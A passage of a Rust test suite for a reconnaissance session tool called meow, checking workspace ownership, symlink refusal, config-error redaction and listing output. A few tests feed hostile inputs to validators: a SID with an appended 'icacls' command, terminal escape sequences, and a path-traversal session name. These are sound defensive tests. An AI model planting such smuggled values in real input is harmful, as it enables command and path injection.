        assert_eq!(fs::read_to_string(outside.join(".zshrc")).unwrap(), "mine");

        // SQLite sidecars and shell init files are also refused if symlinked.
        let (ws_extra, _) = open(&fx, "extra", false);
        fs::create_dir_all(ws_extra.tmp_dir().join("shell")).unwrap();
        for rel in [
            "state.db-wal",
            "state.db-shm",
            "state.db-journal",
            "tmp/shell/.zshenv",
            "tmp/shell/init.ps1",
        ] {
            let link = ws_extra.dir.join(rel);
            std::os::unix::fs::symlink(&secret, &link).unwrap();
            assert!(Workspace::load(&ws_extra.dir).is_err(), "{rel}");
            assert!(
                Workspace::open_or_create(&fx.home, &fx.cwd, "extra", false, Mode::Light).is_err(),
                "{rel}"
            );
            fs::remove_file(&link).unwrap();
        }

        // Such a folder can still be deleted; what its links name stays.
        let (trap, _) = open(&fx, "trap", false);
        std::os::unix::fs::symlink(&secret, trap.dir.join("session.lock")).unwrap();
        std::os::unix::fs::symlink(&outside, trap.dir.join("tmp").join("shell")).unwrap();
        let found = find_for_deletion(&fx.home, &fx.cwd, Some("trap")).unwrap();
        delete(&fx.home, &found).unwrap();
        assert!(!trap.dir.exists());
        assert_eq!(fs::read_to_string(&secret).unwrap(), "k");
        assert_eq!(fs::read_to_string(outside.join(".zshrc")).unwrap(), "mine");

        // A second hard link to a file is refused too (an unpacked archive
        // can carry one), and so is a special file.
        let (ws, _) = open(&fx, "acme", false);
        fs::hard_link(&secret, ws.dir.join("replay.sh")).unwrap();
        let err = Workspace::load(&ws.dir).unwrap_err();
        assert!(format!("{err:#}").contains("hard link"), "{err:#}");
        fs::remove_file(ws.dir.join("replay.sh")).unwrap();
        Workspace::load(&ws.dir).unwrap();
    }

    #[test]
    fn a_session_that_came_with_a_folder_is_not_the_users_until_accepted() {
        const MADE_UP: &str = "00000000000000000000000000000000";
        let fx = fixture();
        // One the user makes here is theirs, on every later open.
        let (own, created) = open(&fx, "mine", true);
        assert!(created && !own.is_foreign(&fx.home));
        own.ensure_own(&fx.home, &fx.cwd).unwrap();
        let (again, created) = open(&fx, "mine", true);
        assert!(!created && !again.is_foreign(&fx.home));
        assert!(!Workspace::load(&own.dir).unwrap().is_foreign(&fx.home));

        // A folder that arrives with a session already in it (a cloned
        // repository): an old `.meow` or a `meow/review`, in aggressive
        // mode, with its own settings, a mark it made up, a graph and a
        // database.
        for (layout, inside) in [("legacy", ".meow"), ("folder", "meow/review")] {
            let cloned = fx.cwd.join(format!("cloned-{layout}"));
            let dir = cloned.join(inside);
            fs::create_dir_all(&dir).unwrap();
            fs::write(
                dir.join("profile.toml"),
                format!("name = \"review\"\nmode = \"aggressive\"\nid = \"{MADE_UP}\"\n"),
            )
            .unwrap();
            fs::write(dir.join("graph.json"), "{ not even json").unwrap();
            fs::write(dir.join("state.db"), "not a database").unwrap();
            let location = find_session(&fx.home, &cloned, "review").unwrap().unwrap();
            let (mut ws, created) =
                Workspace::open_at(&fx.home, &location, "review", Mode::Light).unwrap();
            assert_eq!(ws.dir, dir, "{layout}");
            assert!(!created && ws.is_foreign(&fx.home), "{layout}");
            assert_eq!(ws.profile.mode, Mode::Aggressive);
            // Opening it touched nothing in or around it.
            assert!(!dir.join("tmp").exists(), "{layout}");
            assert!(!cloned.join("meow").join(".gitignore").exists(), "{layout}");
            // Helper commands refuse it, saying what to do.
            let error = Workspace::load(&dir)
                .unwrap()
                .ensure_own(&fx.home, &cloned)
                .unwrap_err();
            let said = format!("{error:#}");
            assert!(said.contains("came with this folder"), "{said}");
            assert!(said.contains("`meow delete review`"), "{said}");
            // The listing names it without opening its graph or database.
            let listed = list_workspaces(&fx.home, &cloned).unwrap();
            let entry = listed.iter().find(|w| w.dir == dir).unwrap();
            assert_eq!(entry.state, SessionState::NotYours);
            assert_eq!((entry.hosts, entry.unfinished_tasks), (0, 0));
            assert!(format_listing(&listed, SystemTime::now()).contains("not yours"));
            // It can be deleted unseen, and checking whether it is closed
            // does not create a `session.lock` file inside it.
            let candidate = find_for_deletion(&fx.home, &cloned, None).unwrap();
            assert_eq!(candidate.dir, dir);
            ensure_closed(&candidate).unwrap();
            assert!(!dir.join(LOCK_FILE).exists());

            // Accepted: the user's own from now on, in the user's default
            // mode and under a mark the folder's author could not know.
            ws.adopt(&fx.home, Mode::Light).unwrap();
            assert!(!ws.is_foreign(&fx.home));
            let loaded = Workspace::load(&dir).unwrap();
            loaded.ensure_own(&fx.home, &cloned).unwrap();
            assert_eq!(loaded.profile.mode, Mode::Light);
            assert_ne!(loaded.profile.id.as_deref(), Some(MADE_UP));
        }
        // The accepted `./meow` got its .gitignore, and its session is
        // found from any folder now.
        let cloned = fx.cwd.join("cloned-folder");
        assert!(is_sessions_marker(&cloned.join("meow").join(".gitignore")));
        assert_eq!(
            find_session(&fx.home, fx.home.root().parent().unwrap(), "review").unwrap(),
            Some(Location::Folder(cloned))
        );
        // The first workspace is still the user's.
        assert!(!Workspace::load(&own.dir).unwrap().is_foreign(&fx.home));
        // A global workspace is never in question.
        let (global, _) = open(&fx, "acme", false);
        assert!(!global.is_foreign(&fx.home) && global.profile.id.is_none());
    }

    #[test]
    fn local_session_lives_in_meow_of_the_folder() {
        let fx = fixture();
        let (ws, created) = open(&fx, "webapp", true);
        assert!(created && ws.local);
        assert_eq!(ws.dir, fx.cwd.join("meow").join("webapp"));
        assert!(ws.dir.is_absolute());
        // `./meow` keeps itself out of git. ~/.meow holds only the mark that
        // says this session is the user's own and where it is.
        let marker = fx.cwd.join("meow").join(".gitignore");
        assert_eq!(fs::read_to_string(&marker).unwrap(), SESSIONS_MARKER_TEXT);
        let mark = ws.profile.id.clone().unwrap();
        assert_eq!(
            fs::read_to_string(fx.home.local_record_path()).unwrap(),
            format!("{mark}\t{}\n", ws.dir.display())
        );
        assert!(!fx.home.workspaces_dir().exists());
        // A second session shares the folder.
        let (beta, _) = open(&fx, "beta", true);
        assert_eq!(beta.dir, fx.cwd.join("meow").join("beta"));
        #[cfg(unix)]
        {
            assert_eq!(mode_of(&fx.cwd.join("meow")), 0o700);
            assert_eq!(mode_of(&marker), 0o600);
        }
        // A changed .gitignore is put back when a session there opens:
        // anything else could let git take in session data.
        fs::write(&marker, "# meow session data: keep it out of git\n!*\n").unwrap();
        open(&fx, "webapp", true);
        assert_eq!(fs::read_to_string(&marker).unwrap(), SESSIONS_MARKER_TEXT);
    }

    #[test]
    fn an_old_dot_meow_is_relabelled_only_once_the_session_records_itself() {
        let fx = fixture();
        let legacy = Location::Legacy(fx.cwd.clone());
        let (ws, created) = Workspace::open_at(&fx.home, &legacy, "webapp", Mode::Light).unwrap();
        assert!(created && ws.local);
        assert_eq!(ws.dir, fx.cwd.join(".meow"));
        let mark = ws.profile.id.clone().unwrap();
        assert_eq!(
            fs::read_to_string(fx.home.local_record_path()).unwrap(),
            format!("{mark}\n")
        );
        // `--local` and a plain `meow webapp` open it by its name.
        assert_eq!(local_location(&fx.home, &fx.cwd, "webapp").unwrap(), legacy);
        assert_eq!(
            find_session(&fx.home, &fx.cwd, "webapp").unwrap(),
            Some(legacy.clone())
        );

        // Reopening under another name relabels the same directory, but only
        // once the new session records itself (after taking the lock).
        let (mut again, created) =
            Workspace::open_at(&fx.home, &legacy, "renamed", Mode::Light).unwrap();
        assert!(!created);
        assert_eq!(again.dir, ws.dir);
        assert_eq!(Workspace::load(&ws.dir).unwrap().name, "webapp");
        let mut helper = Workspace::load(&ws.dir).unwrap();
        helper.set_mode(Mode::Mild).unwrap();
        again.record_open().unwrap();
        assert_eq!(again.profile.mode, Mode::Mild, "helper change was lost");
        let loaded = Workspace::load(&ws.dir).unwrap();
        assert_eq!(loaded.name, "renamed");
        assert!(loaded.local);
    }

    #[test]
    fn the_folder_that_holds_meow_home_can_hold_sessions_but_not_inside_it() {
        let fx = fixture();
        let parent = fx.home.root().parent().unwrap().to_path_buf();
        fs::create_dir_all(fx.home.workspaces_dir()).unwrap();
        // An old `./.meow` there would be meow's own data folder.
        let legacy = Location::Legacy(parent.clone());
        let err = Workspace::open_at(&fx.home, &legacy, "x", Mode::Light).unwrap_err();
        assert!(err.to_string().contains("own data directory"), "{err:#}");
        for inside in [fx.home.root().to_path_buf(), fx.home.workspaces_dir()] {
            let reason = check_new_folder(&fx.home, &inside, "x").unwrap_err();
            assert!(reason.contains("meow's own data folder"), "{reason}");
            assert!(Workspace::open_or_create(&fx.home, &inside, "x", true, Mode::Light).is_err());
        }
        // `./meow` beside it is fine.
        let (ws, _) = Workspace::open_or_create(&fx.home, &parent, "x", true, Mode::Light).unwrap();
        assert_eq!(ws.dir, parent.join("meow").join("x"));
    }

    #[test]
    fn session_env_names_the_workspace_by_absolute_path() {
        let fx = fixture();
        let (mut ws, _) = open(&fx, "webapp", true);
        ws.set_mode(Mode::Mild).unwrap();
        let env = ws.session_env();
        assert_eq!(env[0], ("MEOW_SESSION".to_owned(), "webapp".into()));
        assert_eq!(env[1].0, "MEOW_WORKSPACE");
        assert!(Path::new(&env[1].1).is_absolute());
        assert_eq!(Path::new(&env[1].1), ws.dir);
        assert_eq!(env[2], ("MEOW_MODE".to_owned(), "mild".into()));
    }

    #[test]
    fn a_new_session_forgets_what_a_killed_one_left() {
        let fx = fixture();
        let (ws, _) = open(&fx, "acme", false);
        fs::write(ws.runtime_path(), "{}").unwrap();
        fs::create_dir_all(ws.tmp_dir()).unwrap();
        let page = ws.tmp_dir().join(crate::webui::OPENER_FILE);
        fs::write(&page, "old token").unwrap();
        ws.forget_last_session();
        assert!(!ws.runtime_path().exists());
        assert!(!page.exists());
        // Nothing to forget is fine too.
        ws.forget_last_session();
    }

    #[cfg(unix)]
    #[test]
    fn local_is_refused_in_the_data_directory_however_it_is_reached() {
        let tmp = tempfile::tempdir().unwrap();
        let real = tmp.path().join("real");
        fs::create_dir_all(real.join(".meow")).unwrap();
        std::os::unix::fs::symlink(&real, tmp.path().join("link")).unwrap();
        // The base directory is named through the link, the current
        // directory by its real name, as the system reports it.
        let home = MeowHome::at(tmp.path().join("link").join(".meow")).unwrap();
        let own = "meow's own data directory";
        let error = home.local_dir(&real).unwrap_err().to_string();
        assert!(error.contains(own), "{error}");
        assert!(find_for_deletion(&home, &real, None).is_err());
        assert!(Workspace::open_or_create(&home, &real, "", true, Mode::Light).is_err());
        // And the other way round.
        let home = MeowHome::at(real.join(".meow")).unwrap();
        let error = home
            .local_dir(&tmp.path().join("link"))
            .unwrap_err()
            .to_string();
        assert!(error.contains(own), "{error}");
        // Inside the data directory is refused as well.
        fs::create_dir_all(real.join(".meow").join("workspaces")).unwrap();
        for inside in [real.join(".meow"), real.join(".meow").join("workspaces")] {
            let error = home.local_dir(&inside).unwrap_err().to_string();
            assert!(
                error.contains("inside meow's own data directory"),
                "{error}"
            );
        }
        // A project directory is fine, existing `./.meow` or not.
        let project = tmp.path().join("project");
        fs::create_dir_all(&project).unwrap();
        assert_eq!(home.local_dir(&project).unwrap(), project.join(".meow"));
        fs::create_dir_all(project.join(".meow")).unwrap();
        assert_eq!(home.local_dir(&project).unwrap(), project.join(".meow"));
    }

    #[test]
    fn a_settings_error_names_the_line_and_never_shows_it() {
        const KEY: &str = "FAKE-PLACEHOLDER-KEY-0000-1111-2222";
        let path = Path::new("/home/someone/.meow/config.toml");
        let samples = [
            // The closing quote is missing.
            (format!("[cve]\nenabled = true\nnvd_api_key = \"{KEY}\n"), 3),
            // The key twice.
            (
                format!("[cve]\nnvd_api_key = \"{KEY}\"\nnvd_api_key = \"{KEY}\"\n"),
                3,
            ),
            // No quotes at all.
            (format!("[cve]\nnvd_api_key = {KEY}\n"), 2),
            // The key where a switch belongs.
            (format!("[cve]\nenabled = \"{KEY}\"\n"), 2),
            // The key where a mode belongs.
            (format!("default_mode = \"{KEY}\"\n"), 1),
            // Colour codes on a broken line.
            ("name = \"a\"\n\u{1b}[31mmode = = \u{1b}[2J\n".to_owned(), 2),
        ];
        for (text, line) in samples {
            let error = parse_toml::<Config>(&text, path).unwrap_err();
            let shown = format!("{error:#}");
            assert!(!shown.contains(KEY), "{shown}");
            assert!(!shown.contains("PLACEHOLDER"), "{shown}");
            assert!(!shown.contains('\u{1b}'), "{shown:?}");
            assert!(!shown.contains('\n'), "{shown:?}");
            assert!(
                shown.starts_with(&format!(
                    "invalid /home/someone/.meow/config.toml: line {line}: "
                )),
                "{shown}"
            );
            assert!(!shown.ends_with(": "), "says what is wrong: {shown}");
        }
        // A file that is fine still loads.
        assert!(parse_toml::<Config>(CONFIG_TEMPLATE, path).is_ok());
        assert_eq!(
            without_values("invalid type: string \"abc, expected x\", expected a boolean"),
            "invalid type: string, expected a boolean"
        );
        assert_eq!(
            without_values("unknown variant `abc`, expected one of `light`, `mild`"),
            "unknown value, expected one of `light`, `mild`"
        );
        assert_eq!(without_values("duplicate key `a`"), "duplicate key `a`");
    }

    #[test]
    fn bounded_reads_take_small_regular_files_only() {
        let tmp = tempfile::tempdir().unwrap();
        let file = tmp.path().join("small");
        fs::write(&file, "twelve bytes").unwrap();
        assert_eq!(read_bounded(&file, 12).unwrap(), "twelve bytes");
        assert!(read_bounded(&file, 11).is_err(), "one byte too many");
        assert!(read_bounded(&tmp.path().join("missing"), 12).is_err());
        assert!(read_bounded(tmp.path(), 12).is_err(), "a directory");
        #[cfg(unix)]
        {
            let link = tmp.path().join("link");
            std::os::unix::fs::symlink(&file, &link).unwrap();
            assert!(read_bounded(&link, 12).is_err(), "a link to a small file");
            fs::remove_file(&link).unwrap();
            std::os::unix::fs::symlink("/dev/zero", &link).unwrap();
            assert!(read_bounded(&link, 12).is_err(), "a link to an endless one");
            // The endless file itself: not a regular file, nothing is read.
            assert!(read_bounded(Path::new("/dev/zero"), 12).is_err());
        }
    }

    #[cfg(unix)]
    #[test]
    fn listing_does_not_read_a_huge_graph_or_profile() {
        let fx = fixture();
        let (ws, _) = open(&fx, "acme", false);
        // A graph far over the limit, sparse on disk: counted as no hosts
        // without being read.
        let graph = fs::File::create(ws.graph_path()).unwrap();
        graph.set_len(crate::graph::MAX_GRAPH_BYTES + 1).unwrap();
        assert_eq!(count_hosts(&ws.graph_path()), 0);
        // A real one still counts.
        fs::write(
            ws.graph_path(),
            r#"{"hosts":{"10.0.0.5":{},"10.0.0.6":{}}}"#,
        )
        .unwrap();
        assert_eq!(count_hosts(&ws.graph_path()), 2);
        // A profile that is a link elsewhere, or enormous, is not read.
        let real = fs::read_to_string(ws.profile_path()).unwrap();
        let big = fs::File::create(ws.profile_path()).unwrap();
        big.set_len(PROFILE_MAX + 1).unwrap();
        assert!(Profile::read(&ws.profile_path()).is_err());
        fs::write(ws.profile_path(), &real).unwrap();
        assert!(Profile::read(&ws.profile_path()).is_ok());
    }

    #[test]
    fn restored_cwd_requires_a_recorded_existing_directory() {
        let fx = fixture();
        let (ws, _) = open(&fx, "acme", false);
        assert_eq!(ws.restored_cwd(), None);

        fs::write(ws.last_cwd_path(), format!("{}\n", fx.cwd.display())).unwrap();
        assert_eq!(ws.restored_cwd(), Some(fx.cwd.clone()));

        fs::write(
            ws.last_cwd_path(),
            fx.cwd.join("gone").display().to_string(),
        )
        .unwrap();
        assert_eq!(ws.restored_cwd(), None);
        fs::write(ws.last_cwd_path(), "relative/dir\n").unwrap();
        assert_eq!(ws.restored_cwd(), None);
    }

    #[test]
    fn load_requires_an_existing_workspace() {
        let fx = fixture();
        let err = Workspace::load(&fx.home.workspace_dir("ghost")).unwrap_err();
        assert!(err.to_string().contains("no meow workspace"), "{err:#}");
        assert!(!fx.home.root().exists(), "load must not create anything");
    }

    #[test]
    fn corrupt_profile_is_reported_not_overwritten() {
        let fx = fixture();
        let (ws, _) = open(&fx, "acme", false);
        fs::write(ws.profile_path(), "mode = \"warp\"\n").unwrap();
        let err =
            Workspace::open_or_create(&fx.home, &fx.cwd, "acme", false, Mode::Light).unwrap_err();
        assert!(format!("{err:#}").contains("profile.toml"), "{err:#}");
        assert_eq!(
            fs::read_to_string(ws.profile_path()).unwrap(),
            "mode = \"warp\"\n"
        );
    }

    #[test]
    fn helper_resolution_prefers_flags_then_workspace_env_then_session_env() {
        let fx = fixture();
        open(&fx, "flagged", false);
        open(&fx, "from-session", false);
        let env = SessionEnv {
            session: Some("from-session".into()),
            workspace: Some(fx.cwd.join("elsewhere").join(".meow")),
        };
        let resolve = |local, flag: Option<&str>, env: &SessionEnv| {
            resolve_helper_dir(&fx.home, &fx.cwd, local, flag, env)
        };

        fs::create_dir(fx.cwd.join(".meow")).unwrap();
        assert_eq!(resolve(true, None, &env).unwrap(), fx.cwd.join(".meow"));
        assert_eq!(
            resolve(false, Some("flagged"), &env).unwrap(),
            fx.home.workspace_dir("flagged")
        );
        assert_eq!(
            resolve(false, None, &env).unwrap(),
            fx.cwd.join("elsewhere").join(".meow")
        );
        let session_only = SessionEnv {
            session: Some("from-session".into()),
            workspace: None,
        };
        assert_eq!(
            resolve(false, None, &session_only).unwrap(),
            fx.home.workspace_dir("from-session")
        );

        let none = resolve(false, None, &SessionEnv::default()).unwrap_err();
        assert!(none.to_string().contains("No active meow session"));
        let bad = SessionEnv {
            session: Some("../escape".into()),
            workspace: None,
        };
        assert!(resolve(false, None, &bad).is_err());
        assert!(resolve(false, Some("a/b"), &SessionEnv::default()).is_err());
        // A name that is nowhere is refused, and nothing is created for it.
        for env in [
            SessionEnv::default(),
            SessionEnv {
                session: Some("ghost".into()),
                workspace: None,
            },
        ] {
            let flag = env.session.is_none().then_some("ghost");
            let error = resolve(false, flag, &env).unwrap_err().to_string();
            assert!(error.contains("no meow workspace named 'ghost'"), "{error}");
        }
        assert!(!fx.home.workspace_dir("ghost").exists());
        assert!(!fx.cwd.join("meow").exists());
    }

    #[test]
    fn helper_local_takes_the_only_session_of_the_folder() {
        let fx = fixture();
        let none = SessionEnv::default();
        let local = || resolve_helper_dir(&fx.home, &fx.cwd, true, None, &none);
        // None in ./meow and no old ./.meow: said plainly.
        let error = local().unwrap_err().to_string();
        assert_eq!(
            error,
            "No session in ./meow here; name one with --session <name>"
        );
        let error = find_for_deletion(&fx.home, &fx.cwd, None).unwrap_err();
        assert!(
            error.to_string().contains("`meow delete <name>`"),
            "{error}"
        );
        // An old ./.meow, which `Workspace::load` then checks.
        fs::create_dir(fx.cwd.join(".meow")).unwrap();
        assert_eq!(local().unwrap(), fx.cwd.join(".meow"));
        fs::remove_dir(fx.cwd.join(".meow")).unwrap();
        let (one, _) = open(&fx, "one", true);
        assert_eq!(local().unwrap(), one.dir);
        open(&fx, "two", true);
        let error = local().unwrap_err().to_string();
        assert!(error.contains("several sessions (one, two)"), "{error}");
        assert!(error.contains("--session <name>"), "{error}");
        let error = find_for_deletion(&fx.home, &fx.cwd, None)
            .unwrap_err()
            .to_string();
        assert!(error.contains("`meow delete <name>`"), "{error}");
        // A named one is found from another folder through the record.
        let elsewhere = fx.cwd.join("elsewhere");
        fs::create_dir_all(&elsewhere).unwrap();
        let found = resolve_helper_dir(&fx.home, &elsewhere, false, Some("two"), &none).unwrap();
        assert_eq!(found, fx.cwd.join("meow").join("two"));
        assert!(!elsewhere.join("meow").exists());
    }

    #[test]
    fn workspace_env_is_always_resolved_to_an_absolute_path() {
        let fx = fixture();
        let env = SessionEnv {
            session: None,
            workspace: Some(PathBuf::from(".meow")),
        };
        let dir = resolve_helper_dir(&fx.home, &fx.cwd, false, None, &env).unwrap();
        assert!(dir.is_absolute());
    }

    #[test]
    fn either_variable_marks_an_active_session() {
        assert_eq!(SessionEnv::default().active_label(), None);
        let both = SessionEnv {
            session: Some("acme".into()),
            workspace: Some(PathBuf::from("/w/acme")),
        };
        assert_eq!(both.active_label().as_deref(), Some("acme"));
        let workspace_only = SessionEnv {
            session: None,
            workspace: Some(PathBuf::from("/w/acme")),
        };
        assert_eq!(workspace_only.active_label().as_deref(), Some("/w/acme"));
    }

    #[test]
    fn config_is_created_from_the_template_and_reloaded() {
        let fx = fixture();
        assert_eq!(
            toml::from_str::<Config>(CONFIG_TEMPLATE).unwrap(),
            Config::default()
        );
        // A loaded config also knows where this user's own AI setup lives.
        let mut expected = Config::default();
        expected.ai.user_file = Some(fx.home.root().join("ai.toml"));
        expected.ai.usage_file = Some(fx.home.root().join("ai-usage"));
        expected.recon.wordlist_dir = Some(fx.home.root().join("wordlists"));
        assert_eq!(Config::load_or_create(&fx.home).unwrap(), expected);
        assert_eq!(
            fs::read_to_string(fx.home.config_path()).unwrap(),
            CONFIG_TEMPLATE
        );

        fs::write(
            fx.home.config_path(),
            "default_mode = \"mild\"\nshell = \"/bin/zsh\"\nfuture_key = 1\n",
        )
        .unwrap();
        assert_eq!(
            Config::load_or_create(&fx.home).unwrap(),
            Config {
                default_mode: Mode::Mild,
                shell: Some("/bin/zsh".into()),
                cve: CveSettings::default(),
                recon: expected.recon.clone(),
                ai: expected.ai.clone(),
                location: LocationSettings::default(),
            }
        );

        fs::write(
            fx.home.config_path(),
            "[cve]\nenabled = false\nnvd_api_key = \"k\"\nnvd_url = \"http://127.0.0.1:9/nvd\"\n",
        )
        .unwrap();
        let config = Config::load_or_create(&fx.home).unwrap();
        assert!(!config.cve.enabled);
        assert_eq!(config.cve.nvd_api_key.as_deref(), Some("k"));
        assert_eq!(config.cve.nvd_url, "http://127.0.0.1:9/nvd");
        assert_eq!(config.cve.osv_url, crate::cve::OSV_URL);

        fs::write(fx.home.config_path(), "default_mode = \"warp\"\n").unwrap();
        let err = Config::load_or_create(&fx.home).unwrap_err();
        assert!(format!("{err:#}").contains("config.toml"), "{err:#}");
    }

    #[test]
    fn listing_is_sorted_by_most_recent_activity() {
        let fx = fixture();
        assert_eq!(list_workspaces(&fx.home, &fx.cwd).unwrap(), []);

        let (old, _) = open(&fx, "old", false);
        let (mut busy, _) = open(&fx, "busy", false);
        busy.set_mode(Mode::Mild).unwrap();
        let (local, _) = open(&fx, "webapp", true);
        fs::create_dir(fx.home.workspace_dir("not-a-workspace")).unwrap();

        let now = SystemTime::now();
        let touch = |path: PathBuf, at: SystemTime| {
            fs::File::options()
                .write(true)
                .open(path)
                .unwrap()
                .set_modified(at)
                .unwrap();
        };
        touch(busy.profile_path(), now + Duration::from_secs(7200));
        touch(local.profile_path(), now + Duration::from_secs(3600));

        let listed = list_workspaces(&fx.home, &fx.cwd).unwrap();
        let names: Vec<_> = listed.iter().map(|w| (w.name.as_str(), w.local)).collect();
        assert_eq!(names, [("busy", false), ("webapp", true), ("old", false)]);
        assert_eq!(listed[0].mode, Some(Mode::Mild));
        assert_eq!((listed[0].hosts, listed[0].unfinished_tasks), (0, 0));

        // Host and task counts come from graph.json and state.db.
        fs::write(
            old.graph_path(),
            r#"{"version":1,"updated_utc":"","hosts":{"10.0.0.5":{},"10.0.0.6":{}}}"#,
        )
        .unwrap();
        {
            let db = crate::db::Db::open(&old.state_db_path()).unwrap();
            crate::queue::enqueue(&db, "10.0.0.0/24", Mode::Mild, &[]).unwrap();
        }
        let listed = list_workspaces(&fx.home, &fx.cwd).unwrap();
        let old_row = listed.iter().find(|w| w.name == "old").unwrap();
        assert_eq!((old_row.hosts, old_row.unfinished_tasks), (2, 1));
        assert_eq!(listed[2].dir, old.dir);
    }

    #[test]
    fn listing_is_rendered_as_an_aligned_table() {
        let now = SystemTime::now();
        let row = |name: &str, local, mode: Option<Mode>, secs| WorkspaceSummary {
            name: name.into(),
            dir: PathBuf::from(match name {
                "acme-lab" => "/home/j/.meow/workspaces/acme-lab",
                "web" => "/home/j/proj/meow/web",
                _ => "/srv/x/.meow",
            }),
            local,
            state: match mode {
                Some(Mode::Aggressive) => SessionState::Current,
                Some(Mode::Light) => SessionState::Running,
                _ => SessionState::Closed,
            },
            mode,
            hosts: if local { 12 } else { 0 },
            // What a closed session left is not shown: it is dropped.
            unfinished_tasks: usize::from(local),
            last_active: Some(now - Duration::from_secs(secs)),
            id: None,
        };
        let text = format_listing_with_home(
            &[
                row("acme-lab", false, Some(Mode::Aggressive), 5),
                row("web", true, Some(Mode::Light), 125),
                row("old", true, None, 3 * 86_400 + 10),
            ],
            now,
            Some(Path::new("/home/j")),
        );
        // Where each lives is last, with the home folder shortened to ~.
        let sep = std::path::MAIN_SEPARATOR;
        assert_eq!(
            text,
            format!(
                "NAME      STATE         MODE        HOSTS  TASKS         LAST ACTIVE  WHERE\n\
                 acme-lab  this session  aggressive  0      -             just now     ~{sep}.meow/workspaces/acme-lab\n\
                 web       running       light       12     1 unfinished  2m ago       ~{sep}proj/meow/web\n\
                 old       -             ?           12     -             3d ago       /srv/x/.meow\n"
            )
        );
        assert!(format_listing(&[], now).contains("No workspaces yet"));
        assert_eq!(
            shown_place(Path::new("/home/j"), Some(Path::new("/home/j"))),
            "~"
        );
        assert_eq!(
            shown_place(Path::new("/x/\u{1b}[2J\u{202e}y"), None),
            "/x/[2Jy",
            "a folder name reaches the terminal as text"
        );
        assert_eq!(format_age(Duration::from_secs(7300)), "2h ago");
    }

    #[test]
    fn setup_preferences_update_config_preserving_comments_and_sections() {
        let fx = fixture();
        Config::save_setup_preferences(&fx.home, Mode::Mild, false, Some("nvd-key-\"quoted\""))
            .unwrap();
        let cfg = Config::load_or_create(&fx.home).unwrap();
        assert_eq!(cfg.default_mode, Mode::Mild);
        assert!(!cfg.cve.enabled);
        assert_eq!(cfg.cve.nvd_api_key.as_deref(), Some("nvd-key-\"quoted\""));
        let raw = fs::read_to_string(fx.home.config_path()).unwrap();
        assert!(raw.contains("# meow global configuration."), "{raw}");
        assert!(raw.contains("[recon]"), "{raw}");

        // Clearing the NVD key removes the active key line while keeping comments.
        Config::save_setup_preferences(&fx.home, Mode::Aggressive, true, None).unwrap();
        let cfg = Config::load_or_create(&fx.home).unwrap();
        assert_eq!(cfg.default_mode, Mode::Aggressive);
        assert!(cfg.cve.enabled);
        assert!(cfg.cve.nvd_api_key.is_none());

        // Inline comments on section headers still bound sections cleanly.
        fs::write(
            fx.home.config_path(),
            "default_mode = \"light\"\n\n[cve] # advisories\nenabled = true\n\n[recon] # custom\noutput_cap_mb = 25\n",
        )
        .unwrap();
        Config::save_setup_preferences(&fx.home, Mode::Mild, true, Some("nvd-9999")).unwrap();
        let cfg = Config::load_or_create(&fx.home).unwrap();
        assert_eq!(cfg.cve.nvd_api_key.as_deref(), Some("nvd-9999"));
        assert_eq!(cfg.recon.output_cap_mb, 25);

        // Control characters in keys are rejected before touching disk.
        assert!(
            Config::save_setup_preferences(&fx.home, Mode::Light, true, Some("bad\nkey")).is_err()
        );
    }

    #[test]
    fn windows_sid_and_owner_validation_reject_foreign_and_malformed_sids() {
        let alice = "S-1-5-21-1000-2000-3000-1001";
        let bob = "S-1-5-21-1000-2000-3000-1002";
        let admins = "S-1-5-32-544";
        assert!(is_valid_windows_sid(alice));
        assert!(is_valid_windows_sid("S-1-5-18"));
        assert!(is_valid_windows_sid(admins));
        for bad in [
            "",
            "S-1-",
            "S-1--5",
            "S-1-5-",
            "S-1-5-abc",
            "S-1-5-18;icacls",
            "Everyone",
        ] {
            assert!(!is_valid_windows_sid(bad), "accepted {bad:?}");
        }

        // Unprivileged Alice trusts her own SID and SYSTEM, never Bob or Everyone.
        assert!(is_trusted_windows_owner_sid(alice, alice, alice));
        assert!(is_trusted_windows_owner_sid("S-1-5-18", alice, alice));
        assert!(!is_trusted_windows_owner_sid(bob, alice, alice));
        assert!(!is_trusted_windows_owner_sid("S-1-1-0", alice, alice));
        assert!(!is_trusted_windows_owner_sid(admins, alice, alice));

        // Elevated Alice (token default owner = Administrators) trusts Alice,
        // Administrators, and SYSTEM, and still rejects unprivileged Bob.
        assert!(is_trusted_windows_owner_sid(alice, alice, admins));
        assert!(is_trusted_windows_owner_sid(admins, alice, admins));
        assert!(!is_trusted_windows_owner_sid(bob, alice, admins));
    }

    #[test]
    fn local_workspace_marks_require_hex_deduplicate_and_refuse_symlinks() {
        let fx = fixture();
        assert!(validate_name("ls").is_err());
        assert!(validate_name("rm").is_err());

        let mark = "0123456789abcdef0123456789abcdef";
        remember(&fx.home, mark, None).unwrap();
        remember(&fx.home, mark, None).unwrap();
        assert_eq!(marks(&fx.home), vec![mark.to_owned()]);

        // Non-hex 32-char strings are never accepted or matched as marks.
        let non_hex = "zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz";
        assert!(remember(&fx.home, non_hex, None).is_err());
        fs::write(fx.home.local_record_path(), format!("{non_hex}\n{mark}\n")).unwrap();
        assert_eq!(marks(&fx.home), vec![mark.to_owned()]);
        let dot_meow = fx.cwd.join(".meow");
        assert!(!is_own_at(
            &fx.home,
            &Profile {
                id: Some(non_hex.into()),
                ..Profile::default()
            },
            &dot_meow
        ));
        assert!(is_own_at(
            &fx.home,
            &Profile {
                id: Some(mark.into()),
                ..Profile::default()
            },
            &dot_meow
        ));

        #[cfg(unix)]
        {
            let target = fx.cwd.join("target-marks");
            fs::write(&target, format!("{mark}\n")).unwrap();
            fs::remove_file(fx.home.local_record_path()).unwrap();
            std::os::unix::fs::symlink(&target, fx.home.local_record_path()).unwrap();
            assert!(marks(&fx.home).is_empty());
            assert!(remember(&fx.home, mark, None).is_err());
        }
    }

    #[test]
    fn foreign_workspace_env_and_adopt_guards_prevent_untrusted_use() {
        let fx = fixture();
        // Arbitrary directory NOT named `.meow` passed via MEOW_WORKSPACE must
        // still be rejected by ensure_own unless adopted.
        let rogue = fx.cwd.join("rogue-ws");
        fs::create_dir_all(&rogue).unwrap();
        fs::write(
            rogue.join(PROFILE_FILE),
            "name = \"rogue\"\nmode = \"aggressive\"\n",
        )
        .unwrap();
        let loaded = Workspace::load(&rogue).unwrap();
        assert!(loaded.is_foreign(&fx.home));
        assert!(loaded.ensure_own(&fx.home, &fx.cwd).is_err());

        // MEOW_WORKSPACE pointing at MEOW_HOME or a non-workspace child inside
        // MEOW_HOME is rejected.
        for bad in [
